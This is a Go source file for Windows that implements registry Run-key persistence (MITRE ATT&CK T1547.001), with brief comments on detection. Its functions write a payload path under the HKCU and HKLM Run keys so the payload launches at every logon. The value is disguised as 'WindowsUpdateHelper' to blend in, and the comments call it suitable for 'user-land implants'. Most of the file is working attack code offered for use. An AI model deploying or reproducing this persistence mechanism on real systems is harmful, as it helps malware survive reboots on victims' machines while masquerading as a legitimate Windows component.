// +build windows

// Registry Run Key Persistence - MITRE ATT&CK T1547.001
//
// Writes a value under the Windows "Run" registry key so the payload executes
// on every user logon.  Two variants:
//
//   HKCU  - Current user only, no admin required.  Survives user logon.
//   HKLM  - All users, requires admin.  More impactful but noisier.
//
// Detection: Sysmon Event ID 13 (registry value set), autoruns, reg query on
// the Run keys.  Defenders watch HKLM more closely than HKCU.

package main

import (
	"fmt"
	"os"

	"golang.org/x/sys/windows/registry"
)

const (
	runKeyHKCU = `Software\Microsoft\Windows\CurrentVersion\Run`
	runKeyHKLM = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	valueName  = "WindowsUpdateHelper" // blend-in name
)

// AddRunKeyHKCU writes a Run value under HKEY_CURRENT_USER.
// No elevated privileges required.
func AddRunKeyHKCU(payloadPath string) error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER, runKeyHKCU, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("CreateKey HKCU: %w", err)
	}
	defer k.Close()

	if err := k.SetStringValue(valueName, payloadPath); err != nil {
		return fmt.Errorf("SetStringValue HKCU: %w", err)
	}
	fmt.Printf("[+] HKCU Run key set: %s -> %s\n", valueName, payloadPath)
	return nil
}

// AddRunKeyHKLM writes a Run value under HKEY_LOCAL_MACHINE.
// Requires administrator privileges.
func AddRunKeyHKLM(payloadPath string) error {
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, runKeyHKLM, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("CreateKey HKLM (need admin?): %w", err)
	}
	defer k.Close()

	if err := k.SetStringValue(valueName, payloadPath); err != nil {
		return fmt.Errorf("SetStringValue HKLM: %w", err)
	}
	fmt.Printf("[+] HKLM Run key set: %s -> %s\n", valueName, payloadPath)
	return nil
}

// RemoveRunKey deletes the persistence value from both hives (cleanup helper).
func RemoveRunKey() {
	for _, hive := range []struct {
		root registry.Key
		path string
		name string
	}{
		{registry.CURRENT_USER, runKeyHKCU, "HKCU"},
		{registry.LOCAL_MACHINE, runKeyHKLM, "HKLM"},
	} {
		k, err := registry.OpenKey(hive.root, hive.path, registry.SET_VALUE)
		if err != nil {
			continue
		}
		if err := k.DeleteValue(valueName); err == nil {
			fmt.Printf("[+] Removed %s\\%s\\%s\n", hive.name, hive.path, valueName)
		}
		k.Close()
	}
}

func main() {
	// Default to the current executable path so the sample is self-referential.
	payload := os.Args[0]
	if len(os.Args) > 1 {
		payload = os.Args[1]
	}

	// HKCU - no admin needed, good for user-land implants.
	if err := AddRunKeyHKCU(payload); err != nil {
		fmt.Println("[-] HKCU failed:", err)
	}

	// HKLM - uncomment when running elevated.
	// if err := AddRunKeyHKLM(payload); err != nil {
	//     fmt.Println("[-] HKLM failed:", err)
	// }
}
